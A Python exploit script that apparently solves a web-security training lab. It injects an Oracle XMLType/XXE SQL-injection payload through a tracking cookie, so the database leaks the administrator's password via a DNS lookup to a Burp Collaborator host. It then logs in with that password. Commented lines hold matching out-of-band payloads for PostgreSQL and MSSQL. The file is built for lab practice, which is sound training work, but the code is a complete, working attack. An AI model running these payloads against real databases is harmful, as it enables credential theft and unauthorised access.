import sys
import warnings
from typing import Optional
from urllib.parse import quote_plus, urljoin

from bs4 import BeautifulSoup
from requests import Response
from requests.exceptions import RequestException
from requests.sessions import Session

warnings.filterwarnings("ignore", message="Unverified HTTPS")


class LabExploit:
    def __init__(self, base_url: str, collaborator_domain: str) -> None:
        self.base_url = base_url.rstrip("/")
        self.collaborator_domain = collaborator_domain.rstrip("/")
        self.session = Session()
        self.session.headers.update({"User-Agent": "Security-Scanner-v1"})
        self.session.proxies = {
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080",
        }
        self.vulnerable_cookie = "TrackingId"

    def _request(
        self,
        endpoint: str = "",
        params: Optional[dict] = None,
        data: Optional[dict] = None,
        method: str = "GET",
    ) -> Optional[Response]:
        """Handles all HTTP communication"""
        url = urljoin(self.base_url, endpoint)
        try:
            return self.session.request(
                method=method,
                url=url,
                params=params,
                data=data,
                timeout=(2, 5),
                allow_redirects=True,
                verify=False,
            )
        except RequestException as e:
            print(f"[-] HTTP error: {e}")
            return None

    def is_available(self) -> bool:
        res = self._request()
        return res is not None and "academyLabBanner" in res.text

    def trigger_exfiltration(self) -> None:
        """
        Constructs and injects the Oracle XMLType OAST payload.
        This forces the DB to resolve: [PASSWORD].YOUR_ID.oastify.com
        """
        print(f"[*] Target: {self.base_url}")
        print(f"[*] Using Collaborator: {self.collaborator_domain}")

        subquery = "(SELECT password FROM users WHERE username='administrator')"
        raw_oast_query = (
            f"' || (SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://'||{subquery}||'.{self.collaborator_domain}\"> %remote;]>'),'/l') FROM dual)-- || '"
            # f"' || (SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://{self.collaborator_domain}\"> %remote;]>'),'/l') FROM dual)-- || '"
            # f"' ||(copy (SELECT '') to program 'nslookup {self.collaborator_domain}')|| '"
            # f"' || (exec master..xp_dirtree '//{self.collaborator_domain}/a') || '"
        )
        oast_payload = quote_plus(raw_oast_query)
        for cookie in self.session.cookies:
            if cookie.name == self.vulnerable_cookie:
                original = cookie.value
                cookie.value = f"{original}{oast_payload}"

                print("[*] Sending one-shot exfiltration payload...")
                self.session.request("GET", self.base_url, verify=False)

                cookie.value = original  # Restore
                print("[+] Payload sent. Check your Burp Collaborator tab!")
                return

        print("[-] TrackingId cookie not found in session!")

    def login_and_verfiy(self, username: str, password: str) -> bool:
        """Login anf verifies lab solved status"""
        # Step 1: Extract CSRF token from login page
        res_login = self._request("login")
        if res_login is None or res_login.status_code != 200:
            print("[-] Could not load login page!")
            return False

        soup = BeautifulSoup(res_login.text, "html.parser")
        csrf_tag = soup.find("input", attrs={"name": "csrf"})
        csrf_token = str(csrf_tag.get("value")) if csrf_tag else None
        if not csrf_token:
            print("[-] CSRF token not found in login page!")
            return False
        print(f"[+] CSRF Token: {csrf_token}")

        # Step 2: Login
        login_data = {"csrf": csrf_token, "username": username, "password": password}
        self._request("login", method="POST", data=login_data)

        # Step 3: Verify
        dashboard = self._request("")
        return dashboard is not None and "Congratulation" in dashboard.text

    def solve(self):
        # Check lab availability
        if not self.is_available():
            print("[-] Lab is unavailable!")
            return

        # Trigger OAST
        self.trigger_exfiltration()

        # Ask user to input the password from collab
        admin_pass = input("[?] Enter the password from burp collaborator: ")
        # Verify
        if self.login_and_verfiy("administrator", admin_pass):
            print("[✓] SUCCESS: Logged in and lab solved")
        else:
            print("[-] Lab not solved!")


def main():
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <url> <burp-collab-domain>")
        print(
            f'Example: {sys.argv[0]} "https://lab-id.web-security-academy.net" "http://collab-id.oastify.com"'
        )
        sys.exit(1)

    url = sys.argv[1].strip()
    collab = sys.argv[2].strip()

    exploit = LabExploit(url, collab)
    exploit.solve()


if __name__ == "__main__":
    main()
